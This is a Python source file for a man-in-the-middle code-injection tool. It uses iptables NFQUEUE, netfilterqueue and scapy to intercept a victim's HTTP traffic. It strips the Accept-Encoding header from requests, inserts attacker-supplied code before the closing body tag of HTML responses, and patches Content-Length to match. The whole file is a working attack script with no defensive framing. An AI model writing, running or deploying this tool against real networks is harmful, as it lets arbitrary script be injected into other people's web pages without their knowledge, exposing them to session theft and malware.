import netfilterqueue
import scapy.all as scapy
import optparse
import subprocess
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def processing_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    try:
        if scapy_packet.haslayer(scapy.Raw):
            load = scapy_packet[scapy.Raw].load.decode()

            if scapy_packet[scapy.TCP].dport == 80:
                # print("Victim has sent a HTTP request")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            elif scapy_packet[scapy.TCP].sport == 80:
                # print("Server has sent a HTTP response")
                injection_code = str(options.injection_code)
                load = str(load).replace("</body>", injection_code + "</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(str(content_length), str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
    except UnicodeDecodeError:
        pass

    packet.accept()


def getting_user_arguments():
    parser = optparse.OptionParser()

    parser.add_option("-c", "--chain", dest="chain", help="Please enter the chain you want to hold")
    parser.add_option("-q", "--queues_num", dest="queues_num", help="Please enter the queue_num (it can be anything)")
    parser.add_option("-i", "--injection_code", dest="injection_code", help="Please enter the code you want to "
                                                                            "inject")

    (options, arguments) = parser.parse_args()
    if not options.chain or not options.queues_num:
        parser.error("All arguments are compulsory to be entered, use --help for more info")

    return parser.parse_args()


def creating_binding_queue(chain, queue_number):
    subprocess.call(["service", 'apache2', 'start'])
    subprocess.call("iptables -I " + str(chain).upper() + " -j NFQUEUE --queue-num " + str(queue_number), shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(queue_number), processing_packet)

    try:
        queue.run()
    except KeyboardInterrupt:
        subprocess.call("iptables --flush", shell=True)
        print("CTRL C detected...\n\niptables flushed, all data secured, devices and systems back to "
              "normal.\n\nCode injected!")


(options, arguments) = getting_user_arguments()
creating_binding_queue(options.chain, options.queues_num)